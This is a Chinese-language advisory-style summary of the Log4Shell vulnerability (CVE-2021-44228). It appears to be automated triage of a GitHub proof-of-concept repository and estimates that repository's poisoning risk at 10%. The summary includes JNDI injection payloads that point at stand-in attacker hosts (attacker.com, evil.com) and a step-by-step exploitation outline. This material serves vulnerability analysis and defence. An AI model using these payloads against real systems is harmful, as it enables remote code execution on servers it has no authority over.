## CVE-2021-44228 Apache Log4j2 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j2版本，允许记录用户可控的输入，且启用了message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者通过发送包含特定格式的恶意字符串（例如`${jndi:ldap://attacker.com/exploit}`）到应用程序，如果应用程序使用Log4j2记录该字符串，则Log4j2会尝试通过JNDI从攻击者控制的LDAP服务器检索恶意代码，并执行该代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的POC代码是有效的。大量报告表明该漏洞已被广泛利用。

**投毒风险：**
提供的漏洞利用代码存储库主要包含漏洞分析和利用说明，以及用于设置LDAP和HTTP服务器的示例。`README.md`详细解释了漏洞的利用过程，并提供了相关的图片说明。`LICENSE`文件表明作者声明了代码的版权和使用许可。`marshalsec`目录可能包含利用所需的工具或者payload。总体来看，该仓库主要目的是为了分析和演示该漏洞，而非恶意投毒。但由于代码包含执行恶意代码的步骤，因此存在一定风险。我判断投毒的可能性是10%。因为`marshalsec`工具本身具备一定的攻击性，如果用户不熟悉该工具，可能会被误导或者滥用。

**利用方式：**
1.  攻击者构造包含JNDI查找的恶意请求字符串，例如 `${jndi:ldap://evil.com/a}`。
2.  应用程序使用存在漏洞的Log4j2版本记录此字符串。
3.  Log4j2解析字符串，发起JNDI请求到攻击者控制的LDAP服务器 `evil.com`。
4.  LDAP服务器返回一个指向恶意Java类的URL。
5.  Log4j2加载并执行该恶意Java类，导致远程代码执行。
6.  攻击者可以在目标服务器上执行任意命令。

**项目地址:** [asd58584388/CVE-2021-44228](https://github.com/asd58584388/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)